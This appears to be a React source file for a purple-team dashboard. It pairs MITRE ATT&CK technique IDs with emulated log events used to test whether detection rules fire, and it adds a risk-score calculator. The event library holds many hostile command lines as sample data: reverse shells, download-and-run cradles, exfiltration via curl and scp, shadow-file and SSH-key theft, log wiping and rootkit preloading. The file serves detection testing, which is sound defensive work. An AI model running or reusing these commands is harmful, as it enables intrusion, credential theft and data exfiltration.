import { useState, useEffect } from 'react'
import { useQuery, useMutation } from '@tanstack/react-query'
import { purpleApi } from '../lib/api'
import { Badge } from '../components/Badge'

// ── Emulated event library ────────────────────────────────────────────────────
const EVENT_LIBRARY: Record<string, { label: string; event: object }[]> = {
  'T1059.001': [
    { label: 'Encoded PowerShell', event: { process: 'powershell.exe', command_line: 'powershell -EncodedCommand abc123', log_source: 'winlog' } },
    { label: 'Download cradle', event: { process: 'powershell.exe', command_line: 'powershell IEX (New-Object Net.WebClient).DownloadString("http://45.33.32.156/payload")', log_source: 'winlog' } },
    { label: 'Bypass ExecutionPolicy', event: { process: 'powershell.exe', command_line: 'powershell -ExecutionPolicy Bypass -File C:\\Temp\\evil.ps1', log_source: 'winlog' } },
  ],
  'T1059.004': [
    { label: 'Reverse shell bash', event: { process: 'bash', command_line: 'bash -i >& /dev/tcp/45.33.32.156/4444 0>&1', log_source: 'syslog' } },
    { label: 'Bash -c execution', event: { process: 'bash', command_line: 'bash -c "curl http://45.33.32.156/shell.sh | bash"', log_source: 'syslog' } },
  ],
  'T1059.006': [
    { label: 'Python reverse shell', event: { process: 'python3', command_line: 'python3 -c "import socket,os,pty;s=socket.socket();s.connect((\"45.33.32.156\",4444))"', log_source: 'syslog' } },
    { label: 'Python setuid', event: { process: 'python3', command_line: "python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'", log_source: 'syslog' } },
  ],
  'T1003.008': [
    { label: 'Read /etc/shadow', event: { process: 'cat', command_line: 'cat /etc/shadow', log_source: 'syslog-auth' } },
    { label: 'Unshadow passwd+shadow', event: { process: 'unshadow', command_line: 'unshadow /etc/passwd /etc/shadow > /tmp/hashes.txt', log_source: 'syslog-auth' } },
  ],
  'T1003.007': [
    { label: 'Read proc mem', event: { process: 'cat', command_line: 'cat /proc/1/environ', log_source: 'syslog' } },
    { label: 'Strings on process mem', event: { process: 'strings', command_line: 'strings /proc/$(pgrep sshd)/mem', log_source: 'syslog' } },
  ],
  'T1110.001': [
    { label: 'SSH failed password', event: { process: 'sshd', command_line: 'Failed password for invalid user root from 185.220.101.34 port 22 ssh2', log_source: 'syslog-auth', src_ip: '185.220.101.34' } },
    { label: 'SSH accepted after failures', event: { process: 'sshd', command_line: 'Accepted password for root from 185.220.101.34 port 22 ssh2', log_source: 'syslog-auth', src_ip: '185.220.101.34' } },
  ],
  'T1548.003': [
    { label: 'Sudo bash', event: { process: 'sudo', command_line: 'sudo /bin/bash', log_source: 'syslog-auth' } },
    { label: 'Sudo -l enumeration', event: { process: 'sudo', command_line: 'sudo -l', log_source: 'syslog-auth' } },
    { label: 'Sudo python escape', event: { process: 'sudo', command_line: "sudo python3 -c 'import os; os.system(\"/bin/bash\")'", log_source: 'syslog-auth' } },
  ],
  'T1053.003': [
    { label: 'Reverse shell crontab', event: { process: 'bash', command_line: "echo '* * * * * bash -i >& /dev/tcp/45.33.32.156/4444 0>&1' | crontab -", log_source: 'syslog-cron' } },
    { label: 'Crontab edit', event: { process: 'crontab', command_line: 'crontab -e', log_source: 'syslog-cron' } },
  ],
  'T1053.005': [
    { label: 'Schtasks create', event: { process: 'schtasks.exe', command_line: 'schtasks /create /tn "updater" /tr "C:\\Temp\\evil.exe" /sc onlogon', log_source: 'winlog' } },
    { label: 'Schtasks with PowerShell', event: { process: 'schtasks.exe', command_line: 'schtasks /create /tn "SysUpdate" /tr "powershell -enc abc" /sc daily /st 09:00', log_source: 'winlog' } },
  ],
  'T1562.003': [
    { label: 'HISTFILE=/dev/null', event: { process: 'bash', command_line: 'export HISTFILE=/dev/null', log_source: 'syslog' } },
    { label: 'HISTSIZE=0', event: { process: 'bash', command_line: 'export HISTSIZE=0 HISTFILESIZE=0', log_source: 'syslog' } },
    { label: 'history -c', event: { process: 'bash', command_line: 'history -c && unset HISTFILE', log_source: 'syslog' } },
  ],
  'T1562.001': [
    { label: 'Stop auditd', event: { process: 'systemctl', command_line: 'systemctl stop auditd', log_source: 'syslog' } },
    { label: 'Disable auditd', event: { process: 'systemctl', command_line: 'systemctl disable auditd', log_source: 'syslog' } },
  ],
  'T1070.002': [
    { label: 'Clear auth log', event: { process: 'bash', command_line: 'echo > /var/log/auth.log', log_source: 'syslog' } },
    { label: 'Remove audit log', event: { process: 'rm', command_line: 'rm -rf /var/log/audit/audit.log', log_source: 'syslog' } },
    { label: 'Shred messages', event: { process: 'bash', command_line: 'shred -z /var/log/messages', log_source: 'syslog' } },
  ],
  'T1098': [
    { label: 'Add SSH authorized key', event: { process: 'echo', command_line: 'echo "ssh-rsa ATTACKER_KEY" >> /root/.ssh/authorized_keys', log_source: 'syslog-auth' } },
    { label: 'Add local admin (Windows)', event: { process: 'net.exe', command_line: 'net localgroup administrators hacker /add', log_source: 'winlog' } },
  ],
  'T1021.004': [
    { label: 'SSH with stolen key', event: { process: 'ssh', command_line: 'ssh -i /tmp/stolen_key root@10.103.32.100', log_source: 'syslog-auth' } },
    { label: 'SSH agent forwarding', event: { process: 'ssh', command_line: 'ssh -A -J jumphost root@internal-server', log_source: 'syslog-auth' } },
  ],
  'T1021.001': [
    { label: 'RDP connection', event: { process: 'mstsc.exe', command_line: 'mstsc.exe /v:WIN-DC01', log_source: 'winlog' } },
  ],
  'T1569.002': [
    { label: 'PSExec launch', event: { process: 'psexec.exe', command_line: 'psexec \\\\WIN-SERVER01 -u administrator cmd', log_source: 'winlog' } },
    { label: 'PSExec service', event: { process: 'PSEXESVC', command_line: 'PSEXESVC.exe installed on target', log_source: 'winlog' } },
  ],
  'T1560': [
    { label: 'tar /etc and /home', event: { process: 'tar', command_line: 'tar czf /tmp/loot.tar.gz /etc/ /home/ /root/.ssh/', log_source: 'syslog' } },
    { label: '7zip with password', event: { process: '7z', command_line: '7z a -p secret /tmp/data.7z /etc/ /home/', log_source: 'syslog' } },
  ],
  'T1048': [
    { label: 'curl file upload', event: { process: 'curl', command_line: 'curl -F "file=@/tmp/loot.tar.gz" https://185.220.101.34/upload', log_source: 'syslog' } },
    { label: 'scp exfil', event: { process: 'scp', command_line: 'scp /tmp/loot.tar.gz attacker@185.220.101.34:/exfil/', log_source: 'syslog' } },
  ],
  'T1496.001': [
    { label: 'XMRig miner', event: { process: 'xmrig', command_line: '/tmp/xmrig --donate-level 1 -o stratum+tcp://pool.minexmr.com:443 -u wallet', log_source: 'syslog' } },
    { label: 'Download and run miner', event: { process: 'curl', command_line: 'curl -o /tmp/xmrig http://45.33.32.156/xmrig && chmod +x /tmp/xmrig', log_source: 'syslog' } },
  ],
  'T1505.003': [
    { label: 'Web shell cmd access', event: { process: 'nginx', command_line: 'GET /uploads/shell.php?cmd=id HTTP/1.1 200', log_source: 'nginx' } },
    { label: 'PHP command exec', event: { process: 'php-fpm', command_line: 'php -r \'system("bash -i >& /dev/tcp/45.33.32.156/4444 0>&1");\'', log_source: 'syslog' } },
  ],
  'T1552.004': [
    { label: 'Read SSH private key', event: { process: 'cat', command_line: 'cat /root/.ssh/id_rsa', log_source: 'syslog-auth' } },
    { label: 'Find PEM files', event: { process: 'find', command_line: 'find / -name "*.pem" -o -name "*.key" 2>/dev/null', log_source: 'syslog' } },
  ],
  'T1204.005': [
    { label: 'LD_PRELOAD rootkit', event: { process: 'bash', command_line: 'export LD_PRELOAD=/tmp/rootkit.so', log_source: 'syslog' } },
    { label: 'ld.so.preload inject', event: { process: 'echo', command_line: 'echo /tmp/rootkit.so >> /etc/ld.so.preload', log_source: 'syslog' } },
  ],
  'T1547.001': [
    { label: 'Registry run key', event: { process: 'reg.exe', command_line: 'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Update /t REG_SZ /d "C:\\Temp\\evil.exe"', log_source: 'winlog' } },
  ],
  'T1055.002': [
    { label: 'Process injection', event: { process: 'cmd.exe', command_line: 'VirtualAllocEx WriteProcessMemory CreateRemoteThread', log_source: 'winlog' } },
  ],
  'T1078': [
    { label: 'Valid account SSH login', event: { process: 'sshd', command_line: 'Accepted password for root from 185.220.101.34 port 22 ssh2', log_source: 'syslog-auth', src_ip: '185.220.101.34' } },
  ],
  'T1082': [
    { label: 'uname system info', event: { process: 'uname', command_line: 'uname -a', log_source: 'syslog' } },
    { label: 'systeminfo Windows', event: { process: 'systeminfo.exe', command_line: 'systeminfo', log_source: 'winlog' } },
  ],
  'T1087.001': [
    { label: 'Read /etc/passwd', event: { process: 'cat', command_line: 'cat /etc/passwd', log_source: 'syslog-auth' } },
    { label: 'net user Windows', event: { process: 'net.exe', command_line: 'net user /domain', log_source: 'winlog' } },
  ],
}

const verdictColor = (v: string) =>
  v === 'pass' ? '#a6e3a1' : v === 'partial' ? '#f9e2af' : v === 'fail' ? '#f38ba8' : 'var(--muted)'

const verdictIcon = (v: string) =>
  v === 'pass' ? '✅' : v === 'partial' ? '🔶' : v === 'fail' ? '❌' : '❓'

export function Purple() {
  const runs = useQuery({ queryKey: ['purple-runs'], queryFn: purpleApi.runs })
  const [tid,      setTid]      = useState('T1059.001')
  const [evt,      setEvt]      = useState(JSON.stringify({ process: 'powershell.exe', command_line: 'powershell -EncodedCommand abc123', log_source: 'winlog' }, null, 2))
  const [selected, setSelected] = useState(0)
  const [scoreForm, setScoreForm] = useState({ severity: 7, confidence: 0.85, asset_criticality: 2, chain_tactic_count: 1, is_multi_stage: false })
  const [scoreResult, setScoreResult] = useState<any>(null)

  const suggestions = EVENT_LIBRARY[tid.toUpperCase()] || []

  // Auto-populate first suggestion when technique changes
  useEffect(() => {
    const key = tid.toUpperCase()
    const lib = EVENT_LIBRARY[key]
    if (lib && lib.length > 0) {
      setSelected(0)
      setEvt(JSON.stringify(lib[0].event, null, 2))
    }
  }, [tid])

  const handleSelectSuggestion = (idx: number) => {
    setSelected(idx)
    setEvt(JSON.stringify(suggestions[idx].event, null, 2))
  }

  const validate = useMutation({ mutationFn: ({ t, e }: any) => purpleApi.validate(t, e) })
  const score    = useMutation({
    mutationFn: (data: object) => purpleApi.score(data),
    onSuccess:  (data) => setScoreResult(data),
  })

  return (
    <div>
      <h1 style={{ fontSize: 20, fontWeight: 700, marginBottom: 4 }}>Purple Team</h1>
      <div style={{ fontSize: 12, color: 'var(--muted)', marginBottom: 20 }}>
        Validate that your detection rules fire against emulated attack events
      </div>

      <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 16, marginBottom: 20 }}>

        {/* ── Validation panel ── */}
        <div style={{ background: 'var(--bg2)', border: '1px solid var(--border)', borderRadius: 8, padding: 16 }}>
          <h3 style={{ fontSize: 13, fontWeight: 600, marginBottom: 14 }}>Technique Validation</h3>

          {/* Technique ID */}
          <div style={{ marginBottom: 12 }}>
            <label style={{ fontSize: 11, color: 'var(--muted)', display: 'block', marginBottom: 4 }}>
              TECHNIQUE ID
            </label>
            <input value={tid}
              onChange={e => setTid(e.target.value.toUpperCase())}
              placeholder="e.g. T1059.004"
              style={{ width: '100%', background: 'var(--bg3)', border: '1px solid var(--border)',
                borderRadius: 4, padding: '7px 10px', color: 'var(--text)', fontSize: 13,
                fontFamily: 'monospace' }} />
          </div>

          {/* Suggestions */}
          {suggestions.length > 0 && (
            <div style={{ marginBottom: 12 }}>
              <label style={{ fontSize: 11, color: 'var(--muted)', display: 'block', marginBottom: 6 }}>
                EMULATED EVENT — choose a scenario:
              </label>
              <div style={{ display: 'flex', flexDirection: 'column', gap: 6 }}>
                {suggestions.map((s, i) => (
                  <button key={i} onClick={() => handleSelectSuggestion(i)}
                    style={{
                      textAlign: 'left', padding: '8px 12px', borderRadius: 6, cursor: 'pointer',
                      background: selected === i ? 'var(--accent)22' : 'var(--bg3)',
                      border: `1px solid ${selected === i ? 'var(--accent)' : 'var(--border)'}`,
                      color: selected === i ? 'var(--accent)' : 'var(--text)',
                      fontSize: 12, fontWeight: selected === i ? 600 : 400,
                    }}>
                    {selected === i ? '▶ ' : '○ '}{s.label}
                    <div style={{ fontSize: 10, color: 'var(--muted)', marginTop: 2, fontFamily: 'monospace' }}>
                      {(s.event as any).command_line?.substring(0, 55)}...
                    </div>
                  </button>
                ))}
                <button onClick={() => { setSelected(-1); setEvt('{\n  "process": "",\n  "command_line": "",\n  "log_source": "syslog"\n}') }}
                  style={{
                    textAlign: 'left', padding: '8px 12px', borderRadius: 6, cursor: 'pointer',
                    background: selected === -1 ? 'var(--accent)22' : 'var(--bg3)',
                    border: `1px solid ${selected === -1 ? 'var(--accent)' : 'var(--border)'}`,
                    color: 'var(--muted)', fontSize: 12,
                  }}>
                  ✏  Custom event (edit JSON manually)
                </button>
              </div>
            </div>
          )}

          {suggestions.length === 0 && (
            <div style={{ marginBottom: 8 }}>
              <label style={{ fontSize: 11, color: 'var(--muted)', display: 'block', marginBottom: 4 }}>
                EMULATED EVENT (JSON) — no presets for this technique
              </label>
            </div>
          )}

          {/* JSON editor */}
          <div style={{ marginBottom: 12 }}>
            <label style={{ fontSize: 11, color: 'var(--muted)', display: 'block', marginBottom: 4 }}>
              EVENT JSON {selected >= 0 && suggestions.length > 0 ? '(editable)' : ''}
            </label>
            <textarea value={evt} onChange={e => setEvt(e.target.value)} rows={6}
              style={{ width: '100%', background: 'var(--bg3)', border: '1px solid var(--border)',
                borderRadius: 4, padding: '7px 10px', color: 'var(--text)', fontSize: 11,
                fontFamily: 'monospace', resize: 'vertical' }} />
          </div>

          <button
            onClick={() => {
              try { validate.mutate({ t: tid, e: JSON.parse(evt) }) }
              catch { alert('Invalid JSON — check the event format') }
            }}
            disabled={validate.isPending}
            style={{ padding: '8px 20px', background: 'var(--accent)', color: 'white',
              border: 'none', borderRadius: 6, fontSize: 13, fontWeight: 600, cursor: 'pointer',
              opacity: validate.isPending ? 0.6 : 1 }}>
            {validate.isPending ? '⏳ Running...' : '▶ Run Validation'}
          </button>

          {/* Result */}
          {validate.data && (
            <div style={{ marginTop: 14, padding: 14, background: 'var(--bg3)', borderRadius: 8,
              border: `1px solid ${verdictColor((validate.data as any).verdict)}44` }}>
              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: 10 }}>
                <span style={{ fontSize: 18 }}>{verdictIcon((validate.data as any).verdict)}</span>
                <Badge label={(validate.data as any).verdict?.toUpperCase()}
                  color={verdictColor((validate.data as any).verdict)} />
                <span style={{ fontSize: 13, fontWeight: 700,
                  color: verdictColor((validate.data as any).verdict) }}>
                  {(validate.data as any).detection_rate?.toFixed(0)}% detected
                </span>
              </div>

              <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 8 }}>
                <div style={{ background: '#a6e3a111', border: '1px solid #a6e3a133',
                  borderRadius: 6, padding: '8px 12px' }}>
                  <div style={{ fontSize: 10, color: '#a6e3a1', marginBottom: 4, fontWeight: 700 }}>
                    ✅ RULES FIRED ({(validate.data as any).rules_fired?.length})
                  </div>
                  {(validate.data as any).rules_fired?.length === 0
                    ? <div style={{ fontSize: 11, color: 'var(--muted)' }}>None</div>
                    : (validate.data as any).rules_fired?.map((id: string) => (
                        <div key={id} style={{ fontSize: 10, fontFamily: 'monospace',
                          color: '#a6e3a1', marginBottom: 2 }}>{id.substring(0, 8)}</div>
                      ))
                  }
                </div>
                <div style={{ background: '#f38ba811', border: '1px solid #f38ba833',
                  borderRadius: 6, padding: '8px 12px' }}>
                  <div style={{ fontSize: 10, color: '#f38ba8', marginBottom: 4, fontWeight: 700 }}>
                    ❌ RULES MISSED ({(validate.data as any).rules_missed?.length})
                  </div>
                  {(validate.data as any).rules_missed?.length === 0
                    ? <div style={{ fontSize: 11, color: 'var(--muted)' }}>None</div>
                    : (validate.data as any).rules_missed?.slice(0, 5).map((id: string) => (
                        <div key={id} style={{ fontSize: 10, fontFamily: 'monospace',
                          color: '#f38ba8', marginBottom: 2 }}>{id.substring(0, 8)}</div>
                      ))
                  }
                  {(validate.data as any).rules_missed?.length > 5 && (
                    <div style={{ fontSize: 10, color: 'var(--muted)' }}>
                      +{(validate.data as any).rules_missed.length - 5} more
                    </div>
                  )}
                </div>
              </div>

              {(validate.data as any).verdict === 'fail' && (
                <div style={{ marginTop: 8, padding: '8px 10px', background: '#f38ba811',
                  border: '1px solid #f38ba833', borderRadius: 6,
                  fontSize: 11, color: '#f38ba8' }}>
                  ⚠ No rules fired — create a custom rule for this technique in the Rules page
                </div>
              )}
              {(validate.data as any).verdict === 'partial' && (
                <div style={{ marginTop: 8, padding: '8px 10px', background: '#f9e2af11',
                  border: '1px solid #f9e2af33', borderRadius: 6,
                  fontSize: 11, color: '#f9e2af' }}>
                  🔶 Some rules missed — likely Windows-only Sigma rules. Custom Linux rules are firing correctly.
                </div>
              )}
            </div>
          )}
        </div>

        {/* ── Risk scorer ── */}
        <div style={{ display: 'flex', flexDirection: 'column', gap: 16 }}>
          <div style={{ background: 'var(--bg2)', border: '1px solid var(--border)', borderRadius: 8, padding: 16 }}>
            <h3 style={{ fontSize: 13, fontWeight: 600, marginBottom: 14 }}>Risk Score Calculator</h3>
            {[
              { key: 'severity',          label: 'Severity (1-10)',         min: 1, max: 10,  step: 1   },
              { key: 'confidence',        label: 'Confidence (0-1)',        min: 0, max: 1,   step: 0.05 },
              { key: 'asset_criticality', label: 'Asset Criticality (1-4)', min: 1, max: 4,   step: 1   },
              { key: 'chain_tactic_count',label: 'Tactics in Chain (1-10)', min: 1, max: 10,  step: 1   },
            ].map(({ key, label, min, max, step }) => (
              <div key={key} style={{ marginBottom: 10 }}>
                <label style={{ fontSize: 11, color: 'var(--muted)', display: 'flex',
                  justifyContent: 'space-between', marginBottom: 4 }}>
                  <span>{label}</span>
                  <span style={{ color: 'var(--accent)', fontWeight: 700 }}>
                    {(scoreForm as any)[key]}
                  </span>
                </label>
                <input type="range" min={min} max={max} step={step}
                  value={(scoreForm as any)[key]}
                  onChange={e => setScoreForm(f => ({ ...f, [key]: parseFloat(e.target.value) }))}
                  style={{ width: '100%', accentColor: 'var(--accent)' }} />
              </div>
            ))}

            <div style={{ display: 'flex', alignItems: 'center', gap: 10, marginBottom: 14 }}>
              <label style={{ fontSize: 11, color: 'var(--muted)' }}>Multi-stage chain:</label>
              <button onClick={() => setScoreForm(f => ({ ...f, is_multi_stage: !f.is_multi_stage }))}
                style={{ padding: '3px 14px', borderRadius: 12, border: 'none', cursor: 'pointer', fontSize: 12,
                  background: scoreForm.is_multi_stage ? 'var(--accent)' : 'var(--bg3)',
                  color: scoreForm.is_multi_stage ? 'white' : 'var(--muted)' }}>
                {scoreForm.is_multi_stage ? 'Yes' : 'No'}
              </button>
            </div>

            <button onClick={() => score.mutate(scoreForm)}
              disabled={score.isPending}
              style={{ width: '100%', padding: '8px 0', background: 'var(--accent)', color: 'white',
                border: 'none', borderRadius: 6, fontSize: 13, fontWeight: 600, cursor: 'pointer' }}>
              Calculate Risk Score
            </button>

            {scoreResult && (
              <div style={{ marginTop: 12, textAlign: 'center', padding: 16,
                background: 'var(--bg3)', borderRadius: 8 }}>
                <div style={{ fontSize: 48, fontWeight: 800,
                  color: scoreResult.risk_score >= 80 ? '#f38ba8'
                    : scoreResult.risk_score >= 60 ? '#fab387'
                    : scoreResult.risk_score >= 40 ? '#f9e2af' : '#a6e3a1' }}>
                  {scoreResult.risk_score?.toFixed(1)}
                </div>
                <div style={{ fontSize: 12, color: 'var(--muted)', marginTop: 4 }}>
                  Risk Score (0-100)
                </div>
                {scoreResult.risk_score >= 80 && (
                  <div style={{ marginTop: 8, fontSize: 12, color: '#f38ba8' }}>
                    🔴 Critical — immediate response required
                  </div>
                )}
                {scoreResult.risk_score >= 60 && scoreResult.risk_score < 80 && (
                  <div style={{ marginTop: 8, fontSize: 12, color: '#fab387' }}>
                    🟠 High — investigate within 1 hour
                  </div>
                )}
                {scoreResult.risk_score < 60 && scoreResult.risk_score >= 40 && (
                  <div style={{ marginTop: 8, fontSize: 12, color: '#f9e2af' }}>
                    🟡 Medium — review within 24 hours
                  </div>
                )}
              </div>
            )}
          </div>
        </div>
      </div>

      {/* ── Validation history ── */}
      <div style={{ background: 'var(--bg2)', border: '1px solid var(--border)', borderRadius: 8, padding: 16 }}>
        <h3 style={{ fontSize: 13, fontWeight: 600, marginBottom: 12 }}>
          Validation History ({(runs.data as any)?.length ?? 0} runs)
        </h3>
        {(runs.data as any)?.length === 0 && (
          <div style={{ color: 'var(--muted)', fontSize: 13 }}>No validation runs yet.</div>
        )}
        {(runs.data as any)?.slice(0, 10).map((run: any) => (
          <div key={run.id} style={{ display: 'flex', alignItems: 'center', gap: 12,
            padding: '8px 0', borderBottom: '1px solid var(--border)22' }}>
            <span style={{ fontSize: 16 }}>{verdictIcon(run.verdict)}</span>
            <div style={{ flex: 1 }}>
              <div style={{ display: 'flex', gap: 8, alignItems: 'center' }}>
                <span style={{ fontFamily: 'monospace', fontSize: 12, fontWeight: 600 }}>
                  {run.technique_id}
                </span>
                <Badge label={run.verdict?.toUpperCase()} color={verdictColor(run.verdict)} />
                <span style={{ fontSize: 11, color: 'var(--muted)' }}>
                  {run.detection_rate?.toFixed(0)}% detected
                </span>
              </div>
              <div style={{ fontSize: 10, color: 'var(--muted)', marginTop: 2 }}>
                fired: {run.rules_fired?.length} / missed: {run.rules_missed?.length}
                &nbsp;·&nbsp;{new Date(run.created_at).toLocaleString()}
              </div>
            </div>
          </div>
        ))}
      </div>
    </div>
  )
}
